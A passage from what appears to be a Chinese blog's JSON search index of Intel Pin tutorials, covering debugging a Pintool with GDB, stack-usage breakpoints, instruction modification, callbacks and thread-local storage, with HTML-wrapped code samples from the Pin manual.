class=\"keyword\">stack</span>-debugger.<span class=\"keyword\">test</span></div></pre></td></tr></table></figure></p>\n<p>tool 及其相关测试程序  “fibonacci” 在 “obj-ia32”（x86）/ “obj-intel64”(x64) 目录中。</p>\n<p>Pin 命令添加 <font color=\"blue\">-appdebug</font> 选项，开启调试扩展。<br>执行命令后， Pin 会启动应用程序并停在第一条指令前，然后输出“开启GDB”提示信息，。</p>\n<figure class=\"highlight livescript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ ..<span class=\"regexp\">/../</span>../pin -appdebug -t obj-intel64/stack-<span class=\"keyword\">debugger</span>.so -- obj-intel64/fibonacci <span class=\"number\">1000</span></div><div class=\"line\">Application stopped <span class=\"keyword\">until</span> continued <span class=\"keyword\">from</span> <span class=\"keyword\">debugger</span>.</div><div class=\"line\">Start GDB, <span class=\"keyword\">then</span> issue <span class=\"keyword\">this</span> command at the (gdb) prompt:</div><div class=\"line\">  target remote :<span class=\"number\">33030</span></div></pre></td></tr></table></figure>\n<p>在另一个终端中开启 GDB，输入 提示信息中的命令。<br><figure class=\"highlight aspectj\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ gdb fibonacci</div><div class=\"line\">(gdb) <span class=\"keyword\">target</span> remote :33030</div></pre></td></tr></table></figure></p>\n<p>此时，调试器已经附加了在 Pin 下运行的应用程序，你可以设置断点，继续执行，打印变量，反汇编代码等。<br><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">(gdb) <span class=\"keyword\">break</span> main</div><div class=\"line\">Breakpoint 1 at 0x401194: <span class=\"keyword\">file</span> fibonacci.cpp, <span class=\"keyword\">line</span> 12.</div><div class=\"line\">(gdb) cont</div><div class=\"line\">Continuing.</div><div class=\"line\"></div><div class=\"line\">Breakpoint 1, main (argc=2, argv=0x7fbffff3c8) at fibonacci.cpp:12</div><div class=\"line\">12          <span class=\"keyword\">if</span> (argc &gt; 2)</div><div class=\"line\">(gdb) <span class=\"keyword\">print</span> argc</div><div class=\"line\"><span class=\"variable\">$1</span> = 2</div><div class=\"line\">(gdb) x/4i <span class=\"variable\">$pc</span></div><div class=\"line\">0x401194 &lt;main+27&gt;:     cmpl   <span class=\"variable\">$0x2</span>,0xfffffffffffffe5c(%rbp)</div><div class=\"line\">0x40119b &lt;main+34&gt;:     je     0x4011c8 &lt;main+79&gt;</div><div class=\"line\">0x40119d &lt;main+36&gt;:     <span class=\"keyword\">mov</span>    <span class=\"variable\">$0x402080</span>,%esi</div><div class=\"line\">0x4011a2 &lt;main+41&gt;:     <span class=\"keyword\">mov</span>    <span class=\"variable\">$0x603300</span>,%<span class=\"keyword\">edi</span></div></pre></td></tr></table></figure></p>\n<p>当然，你在调试器中观察到的所有信息都是应用程序的原始状态，Pin 和 tool 的 instrumentation 细节都隐藏了。<br>如，上面显示的汇编代码都是应用程序的指令，没有 tool 插入的指令。但是当使用 “cont” 或 “step” 命令执行程序时，Pin 下的 tool instrumentation 会正常运行。</p>\n<font color=\"red\">注意：使用 “target remote”  命令连接 GDB 后，不能使用 “run” 命令，因为程序已经运行并停在第一条指令前，只需使用 “cont” 命令继续执行程序。</font>\n\n<h2 id=\"2、Adding-New-Debugger-Commands\"><a href=\"#2、Adding-New-Debugger-Commands\" class=\"headerlink\" title=\"2、Adding New Debugger Commands\"></a>2、Adding New Debugger Commands</h2><p>本节主要讲述在不修改 GDB 的情况下，为 Pintool 增加自定义调试命令，此命令允许程序员通过 live debugger session 控制 Pintool，比如，设置 Pintool输出收集到的信息，或只在程序的特定阶段开启 instrumentation。</p>\n<p>详细参见  PIN_AddDebugInterpreter() ，该 API 的回调函数如下：<br><figure class=\"highlight zephir\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">BOOL</span> DebugInterpreter(THREADID tid, CONTEXT *ctxt, <span class=\"keyword\">const</span> string &amp;cmd, string *result, VOID *)</div><div class=\"line\">&#123;</div><div class=\"line\">    TINFO_MAP::iterator it = ThreadInfos.find(tid);</div><div class=\"line\">    <span class=\"keyword\">if</span> (it == ThreadInfos.end())</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">FALSE</span>;</div><div class=\"line\">    TINFO *tinfo = it-&gt;second;</div><div class=\"line\"></div><div class=\"line\">    std::string line = TrimWhitespace(cmd);</div><div class=\"line\">    *result = <span class=\"string\">\"\"</span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// [...]</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">if</span> (line == <span class=\"string\">\"stats\"</span>)</div><div class=\"line\">    &#123;</div><div class=\"line\">        ADDRINT sp = PIN_GetContextReg(ctxt, REG_STACK_PTR);</div><div class=\"line\">        tinfo-&gt;_os.str(<span class=\"string\">\"\"</span>);</div><div class=\"line\">        <span class=\"keyword\">if</span> (sp &lt;= tinfo-&gt;_stackBase)</div><div class=\"line\">            tinfo-&gt;_os &lt;&lt; <span class=\"string\">\"Current stack usage: \"</span> &lt;&lt; std::dec &lt;&lt; (tinfo-&gt;_stackBase - sp) &lt;&lt; <span class=\"string\">\" bytes.\\n\"</span>;</div><div class=\"line\">        <span class=\"keyword\">else</span></div><div class=\"line\">            tinfo-&gt;_os &lt;&lt; <span class=\"string\">\"Current stack usage: -\"</span> &lt;&lt; std::dec &lt;&lt; (sp - tinfo-&gt;_stackBase) &lt;&lt; <span class=\"string\">\" bytes.\\n\"</span>;</div><div class=\"line\">        tinfo-&gt;_os &lt;&lt; <span class=\"string\">\"Maximum stack usage: \"</span> &lt;&lt; tinfo-&gt;_max &lt;&lt; <span class=\"string\">\" bytes.\\n\"</span>;</div><div class=\"line\">        *result = tinfo-&gt;_os.str();</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">TRUE</span>;</div><div class=\"line\">    &#125;</div><div class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (line == <span class=\"string\">\"stacktrace on\"</span>)</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"keyword\">if</span> (!EnableInstrumentation)</div><div class=\"line\">        &#123;</div><div class=\"line\">            PIN_RemoveInstrumentation();</div><div class=\"line\">            EnableInstrumentation = <span class=\"keyword\">true</span>;</div><div class=\"line\">            *result = <span class=\"string\">\"Stack tracing enabled.\\n\"</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">TRUE</span>;</div><div class=\"line\">    &#125;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// [...]</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">FALSE</span>;  <span class=\"comment\">// Unknown command</span></div><div class=\"line\"></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p> PIN_AddDebugInterpreter() API 允许 Pintool 为 扩展 GDB 命令创建句柄（handler），如上面的代码段实现了新命令 “stats” 和 “stacktrace on”。<br> 在 GDB 中使用 “monitor” 命令执行上述命令:<br> <figure class=\"highlight smali\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"> (gdb)<span class=\"built_in\"> monitor </span>stats</div><div class=\"line\">Current stack usage: 688 bytes.</div><div class=\"line\">Maximum stack usage: 0 bytes.</div></pre></td></tr></table></figure></p>\n<p>当用户输入一个扩展调试命令时，Pintool可以做很多事情，如，”stats” 命令打印 tool 收集到的信息，任何 tool 写入“结果”参数中的文本会输出到 GDB 控制台。</p>\n<p>程序员还可以使用 调试扩展命令 启用/禁止 Pintool instrumentation，比如，”stacktrace on” 命令。如果想要在应用的程序初始启动阶段快速启动 Pintool，可以禁用 Pintool instrumentation，直到触发一个断点，然后使用扩展命令，只在程序员感兴趣的应用程序执行阶段开启 instrumentation 。在上面的 stack-debugger 示例中，PIN_RemoveInstrumentation() 函数移除所有的 instrumentation，然后当调试器继续执行应用程序时，tool 重新 instrument 代码。稍后会介绍，tool 的全局变量 “EnableInstrumentation” 调整插入过的 instrumentation 。</p>\n<h2 id=\"3、Semantic-Breakpoints-语义断点\"><a href=\"#3、Semantic-Breakpoints-语义断点\" class=\"headerlink\" title=\"3、Semantic Breakpoints 语义断点\"></a>3、Semantic Breakpoints 语义断点</h2><p>高级调试扩展的最后一个功能为：调用 tool analysis 中的 API 使程序停在断点处，此功能虽然简单，但很强大。Pintool 通过 instrumentation 查找复杂的条件，当满足条件时，停在断点处。</p>\n<p>“stack-debugger” tool 对所有分配栈空间的指令进行插装，一旦应用程序的栈空间达到某一阈值，程序停在断点处。传统调试器并不能实现此功能，因为传统调试器不可能找到所有分配栈空间的指令。</p>\n<p>以下是 “stack-debugger” tool 中的部分代码，功能为：使用 Pin instrumentation 检索所有分配栈空间的指令。<br><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">static VOID <span class=\"keyword\">Instruction(INS </span><span class=\"keyword\">ins, </span>VOID *)</div><div class=\"line\">&#123;</div><div class=\"line\">    if (!EnableInstrumentation)</div><div class=\"line\">        return<span class=\"comment\">;</span></div><div class=\"line\"></div><div class=\"line\">    if (<span class=\"keyword\">INS_RegWContain(ins, </span>REG_STACK_PTR))</div><div class=\"line\">    &#123;</div><div class=\"line\">        IPOINT where = IPOINT_AFTER<span class=\"comment\">;</span></div><div class=\"line\">        if (!<span class=\"keyword\">INS_HasFallThrough(ins))</span></div><div class=\"line\">            where = IPOINT_TAKEN_BRANCH<span class=\"comment\">;</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">INS_InsertIfCall(ins, </span>where, (AFUNPTR)OnStackChangeIf, IARG_REG_VALUE, REG_STACK_PTR,</div><div class=\"line\">            IARG_REG_VALUE, RegTinfo, IARG_END)<span class=\"comment\">;</span></div><div class=\"line\">        <span class=\"keyword\">INS_InsertThenCall(ins, </span>where, (AFUNPTR)DoBreakpoint, IARG_CONST_CONTEXT, IARG_THREAD_ID, IARG_END)<span class=\"comment\">;</span></div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p> INS_RegWContain() 判断指令是否修改栈指针，如果是，在此条指令后插入 analysis 函数，检查应用程序的栈空间是否超过某一阈值。</p>\n<p> <font color=\"red\">注意：</font>所有 instrumentation 的开启/禁用由全局标识变量 “EnableInstrumentation” 设置。因此，在不感兴趣的应用程序执行阶段，禁用 instrumentation（使用 “stacktrace off” 设置），快速执行程序；然后在感兴趣阶段开启 instrumentation （使用 “stacktrace on” 设置）。</p>\n<p>如果应用程序的栈空间超过某一阈值， OnStackChangeIf() 返回 TRUE，如果返回值为 TRUE，调用 DoBreakpoint() 停在断点处。</p>\n<figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">static</span> ADDRINT OnStackChangeIf(ADDRINT sp, ADDRINT addrInfo)</div><div class=\"line\">&#123;</div><div class=\"line\">    TINFO *tinfo = <span class=\"keyword\">reinterpret_cast</span>&lt;TINFO *&gt;(addrInfo);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// The stack pointer may go above the base slightly.  (For example, the application's dynamic</span></div><div class=\"line\">    <span class=\"comment\">// loader does this briefly during start-up.)</span></div><div class=\"line\">    <span class=\"comment\">//</span></div><div class=\"line\">    <span class=\"built_in\">if</span> (sp &gt; tinfo-&gt;_stackBase)</div><div class=\"line\">        <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Keep track of the maximum stack usage.</span></div><div class=\"line\">    <span class=\"comment\">//</span></div><div class=\"line\">    size_t <span class=\"built_in\">size</span> = tinfo-&gt;_stackBase - sp;</div><div class=\"line\">    <span class=\"built_in\">if</span> (<span class=\"built_in\">size</span> &gt; tinfo-&gt;_max)</div><div class=\"line\">        tinfo-&gt;_max = <span class=\"built_in\">size</span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// See if we need to trigger a breakpoint.</span></div><div class=\"line\">    <span class=\"comment\">//</span></div><div class=\"line\">    <span class=\"built_in\">if</span> (BreakOnNewMax &amp;&amp; <span class=\"built_in\">size</span> &gt; tinfo-&gt;_maxReported)</div><div class=\"line\">        <span class=\"built_in\">return</span> <span class=\"number\">1</span>;</div><div class=\"line\">    <span class=\"built_in\">if</span> (BreakOnSize &amp;&amp; <span class=\"built_in\">size</span> &gt;= BreakOnSize)</div><div class=\"line\">        <span class=\"built_in\">return</span> <span class=\"number\">1</span>;</div><div class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">static</span> VOID DoBreakpoint(<span class=\"keyword\">const</span> CONTEXT *ctxt, THREADID tid)</div><div class=\"line\">&#123;</div><div class=\"line\">    TINFO *tinfo = <span class=\"keyword\">reinterpret_cast</span>&lt;TINFO *&gt;(PIN_GetContextReg(ctxt, RegTinfo));</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Keep track of the maximum reported stack usage for \"stackbreak newmax\".</span></div><div class=\"line\">    <span class=\"comment\">//</span></div><div class=\"line\">    size_t <span class=\"built_in\">size</span> = tinfo-&gt;_stackBase - PIN_GetContextReg(ctxt, REG_STACK_PTR);</div><div class=\"line\">    <span class=\"built_in\">if</span> (<span class=\"built_in\">size</span> &gt; tinfo-&gt;_maxReported)</div><div class=\"line\">        tinfo-&gt;_maxReported = <span class=\"built_in\">size</span>;</div><div class=\"line\"></div><div class=\"line\">    ConnectDebugger();  <span class=\"comment\">// Ask the user to connect a debugger, if it is not already connected.</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Construct a string that the debugger will print when it stops.  If a debugger is</span></div><div class=\"line\">    <span class=\"comment\">// not connected, no breakpoint is triggered and execution resumes immediately.</span></div><div class=\"line\">    <span class=\"comment\">//</span></div><div class=\"line\">    tinfo-&gt;_os.str(<span class=\"string\">\"\"</span>);</div><div class=\"line\">    tinfo-&gt;_os &lt;&lt; <span class=\"string\">\"Thread \"</span> &lt;&lt; std::dec &lt;&lt; tid &lt;&lt; <span class=\"string\">\" uses \"</span> &lt;&lt; <span class=\"built_in\">size</span> &lt;&lt; <span class=\"string\">\" bytes of stack.\"</span>;</div><div class=\"line\">    PIN_ApplicationBreakpoint(ctxt, tid, FALSE, tinfo-&gt;_os.str());</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>OnStackChangeIf() 跟踪栈使用情况，并判断栈空间是否达到阈值。如果时，返回非0（即 TRUE ），Pin执行 DoBreakpoint()。</p>\n<p>DoBreakpoint() 的最后调用  PIN_ApplicationBreakpoint() ，停止所有线程的执行，并触发调试器中断。当中断触发时，GDB 的控制台输出  PIN_ApplicationBreakpoint() 的字符串参数，此参数告诉用户为什么会触发中断，本例中，此字符串为 “Thread 10 uses 4000 bytes of stack” 。</p>\n<figure class=\"highlight smali\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">(gdb)<span class=\"built_in\"> monitor </span>stackbreak 4000</div><div class=\"line\">Will break when thread uses more than 4000 bytes of stack.</div><div class=\"line\">(gdb) c</div><div class=\"line\">Continuing.</div><div class=\"line\">Thread 0 uses 4000 bytes of stack.</div><div class=\"line\">Program received signal SIGTRAP, Trace/breakpoint trap.</div><div class=\"line\">0x0000000000400e27 in Fibonacci (num=0) at fibonacci.cpp:34</div><div class=\"line\">(gdb)</div></pre></td></tr></table></figure>\n<p>此时，你可以继续执行程序，或终止程序：<br><figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">(gdb) <span class=\"built_in\">quit</span></div><div class=\"line\">The <span class=\"built_in\">program</span> <span class=\"built_in\">is</span> running.  Exit anyway? (y <span class=\"keyword\">or</span> n) y</div></pre></td></tr></table></figure></p>\n<h2 id=\"4、Connecting-the-Debugger-Later\"><a href=\"#4、Connecting-the-Debugger-Later\" class=\"headerlink\" title=\"4、Connecting the Debugger Later\"></a>4、Connecting the Debugger Later</h2><p>上例使用 “ -appdebug” 停止程序并从第一条指令开始调试，本小节将介绍程序不停在第一条指令之后，而是其他位置。<br>下例说明了如何使用 stack-debugger tool 启动应用程序，并只在触发“栈上限”断点时，调试器才附加程序。<br><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ ..<span class=\"regexp\">/../</span>..<span class=\"regexp\">/pin -appdebug_enable -appdebug_silent -t obj-intel64/</span>stack-debugger.so -stackbreak <span class=\"number\">4000</span> -- obj-intel64<span class=\"regexp\">/fibonacci 1000</span></div></pre></td></tr></table></figure></p>\n<ul>\n<li>-appdebug_enable选项，开始调试程序的位置不为第一条指令</li>\n<li>-appdebug_silent，自定义 GDB 控制台提示信息，详见下例</li>\n<li>-stackbreak 4000，当栈空间超过 4000 时，触发断点。当触发断点时，输出如下消息：<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">Triggered stack-limit <span class=\"built_in\">breakpoint</span>.</div><div class=\"line\">Start GDB <span class=\"keyword\">and</span> enter this <span class=\"keyword\">command</span>:</div><div class=\"line\">  target remote :<span class=\"number\">45462</span></div></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>连接 GDB 的方式和之前一样，只是 GDB 停在“栈上限”断点处。<br><figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">gdb fibonacci</div><div class=\"line\">(gdb) target <span class=\"string\">remote :</span><span class=\"number\">45462</span></div><div class=\"line\"><span class=\"number\">0x0000000000400e27</span> <span class=\"keyword\">in</span> Fibonacci (num=<span class=\"number\">0</span>) at fibonacci.<span class=\"string\">cpp:</span><span class=\"number\">37</span></div><div class=\"line\">(gdb)</div></pre></td></tr></table></figure></p>\n<p>以下是 连接调试器的代码：<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">ConnectDebugger</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"keyword\">if</span> (PIN_GetDebugStatus() != DEBUG_STATUS_UNCONNECTED)</div><div class=\"line\">        <span class=\"keyword\">return</span>;</div><div class=\"line\"></div><div class=\"line\">    DEBUG_CONNECTION_INFO info;</div><div class=\"line\">    <span class=\"keyword\">if</span> (!PIN_GetDebugConnectionInfo(&amp;info) || info<span class=\"number\">._</span>type != DEBUG_CONNECTION_TYPE_TCP_SERVER)</div><div class=\"line\">        <span class=\"keyword\">return</span>;</div><div class=\"line\"></div><div class=\"line\">    *Output &lt;&lt; <span class=\"string\">\"Triggered stack-limit breakpoint.\\n\"</span>;</div><div class=\"line\">    *Output &lt;&lt; <span class=\"string\">\"Start GDB and enter this command:\\n\"</span>;</div><div class=\"line\">    *Output &lt;&lt; <span class=\"string\">\"  target remote :\"</span> &lt;&lt; <span class=\"built_in\">std</span>::dec &lt;&lt; info<span class=\"number\">._</span>tcpServer<span class=\"number\">._</span>tcpPort &lt;&lt; <span class=\"string\">\"\\n\"</span>;</div><div class=\"line\">    *Output &lt;&lt; <span class=\"built_in\">std</span>::flush;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">if</span> (PIN_WaitForDebuggerToConnect(<span class=\"number\">1000</span>*KnobTimeout.Value()))</div><div class=\"line\">        <span class=\"keyword\">return</span>;</div><div class=\"line\"></div><div class=\"line\">    *Output &lt;&lt; <span class=\"string\">\"No debugger attached after \"</span> &lt;&lt; KnobTimeout.Value() &lt;&lt; <span class=\"string\">\" seconds.\\n\"</span>;</div><div class=\"line\">    *Output &lt;&lt; <span class=\"string\">\"Resuming application without stopping.\\n\"</span>;</div><div class=\"line\">    *Output &lt;&lt; <span class=\"built_in\">std</span>::flush;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>每当 tool 需停在断点处，会调用 ConnectDebugger() 函数，它首先调用 PIN_GetDebugStatus() 判断是否和调试器连接。如果没有，使用 PIN_GetDebugConnectionInfo() 获取 TCP 端口号，用于连接 GDB，本例中的端口号为 “45462”，在 “target remote” 命令中使用。<br> PIN_WaitForDebuggerToConnect() 等待连接 GDB，如果一段时间后，用户没有开启GBD并附加进程，tool 输出一条提示信息，然后继续执行程序。</p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://software.intel.com/sites/landingpage/pintool/docs/67254/Pin/html/index.html#APPDEBUG\" target=\"_blank\" rel=\"external\">Pin 用户手册：The Pin Advanced Debugging Extensions</a></p>\n"},{"title":"Intel Pin 4 ：修改应用程序指令","url":"http://huirong.github.io/2016/01/12/Intel-Pin-Modifying-Application-Instructions/","content":"<p>Pin通常用于插装应用程序，它也用于修改程序指令。<br><a id=\"more\"></a><br>最简单的方法是插入一个分析程序模拟一个指令，然后使用INS_Delete()删除原来的指令。还可以插入 直接 或 间接 分支指令（使用  INS_InsertDirectJump 和 INS_InsertIndirectJump），模拟控制流转移指令。</p>\n<p>指令访问的内存地址可修改为由 INS_RewriteMemoryOperand 计算出的值的引用。</p>\n<p>注意：只有当所有的 instrumentation routines 执行完后，修改才生效。因此，所有的 instrumentation routines 看到的都是原始的、未修改的指令。</p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://software.intel.com/sites/landingpage/pintool/docs/67254/Pin/html/index.html#MODIFYING\" target=\"_blank\" rel=\"external\">Pin 用户手册：Modifying Application Instructions</a> </p>\n"},{"title":"Intel Pin 3 ：回调函数","url":"http://huirong.github.io/2016/01/12/Intel-Pin-Callbacks/","content":"<p>前几篇 Intel Pin example 已经介绍了几种使用 Pin API 注册回调函数的方法。<br><a id=\"more\"></a><br>如：</p>\n<ul>\n<li>INS_AddInstrumentFunction (INSCALLBACK fun, VOID *val)</li>\n<li>TRACE_AddInstrumentFunction (TRACECALLBACK fun, VOID *val)</li>\n<li>RTN_AddInstrumentFunction (RTNCALLBACK fun, VOID *val)</li>\n<li>IMG_AddInstrumentFunction (IMGCALLBACK fun, VOID *val)</li>\n<li>PIN_AddFiniFunction (FINICALLBACK fun, VOID *val)</li>\n<li>PIN_AddDetachFunction (DETACHCALLBACK fun, VOID *val)</li>\n</ul>\n<p>前四种分别在 instruction instrumentation（指令插桩）、 trace instrumentation（踪迹插桩）、Routine instrumentation（函数插桩）、Image instrumentation（镜像插桩）时使用。</p>\n<p>所有注册函数，第二个参数相同。当不需要注册回调函数时，val 设置为 0 ，通常情况下，val 为指向一个类实例的指针。</p>\n<p>注意：所有注册函数返回 PIN_CALLBACK 对象，可调用 PIN_CALLBACK 操作API 修改注册过的回调函数属性。（参见 <a href=\"https://software.intel.com/sites/landingpage/pintool/docs/67254/Pin/html/group__PIN__CALLBACKS.html\" target=\"_blank\" rel=\"external\">PIN callbacks</a>）</p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://software.intel.com/sites/landingpage/pintool/docs/67254/Pin/html/index.html#CALLBACK\" target=\"_blank\" rel=\"external\">Pin 用户手册 Callbacks</a></p>\n"},{"title":"Intel Pin 2 ：示例（再续）","url":"http://huirong.github.io/2016/01/10/Intel-Pin-Example4/","content":"<p>继续Intel Pin示例系列。<br><a id=\"more\"></a></p>\n<h1 id=\"Using-TLS\"><a href=\"#Using-TLS\" class=\"headerlink\" title=\"Using TLS\"></a>Using TLS</h1><p>Pin提供了高效的线程本地存储（ thread local storage (TLS) ）APIs，用于创建线程特定数据。<br>下例展示了如何使用这些APIs。<br><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ ../../../pin -t obj-ia32/inscount_tls.so -- obj-ia32/thread_lin</div><div class=\"line\">$ head</div><div class=\"line\">Count[<span class=\"number\">0</span>]= <span class=\"number\">237993</span></div><div class=\"line\">Count[<span class=\"number\">1</span>]= <span class=\"number\">213296</span></div><div class=\"line\">Count[<span class=\"number\">2</span>]= <span class=\"number\">209223</span></div><div class=\"line\">Count[<span class=\"number\">3</span>]= <span class=\"number\">209223</span></div><div class=\"line\">Count[<span class=\"number\">4</span>]= <span class=\"number\">209223</span></div><div class=\"line\">Count[<span class=\"number\">5</span>]= <span class=\"number\">209223</span></div><div class=\"line\">Count[<span class=\"number\">6</span>]= <span class=\"number\">209223</span></div><div class=\"line\">Count[<span class=\"number\">7</span>]= <span class=\"number\">209223</span></div><div class=\"line\">Count[<span class=\"number\">8</span>]= <span class=\"number\">209223</span></div><div class=\"line\">Count[<span class=\"number\">9</span>]= <span class=\"number\">209223</span></div></pre></td></tr></table></figure></p>\n<p>源码参见 source/tools/ManualExamples/inscount_tls.cpp<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div 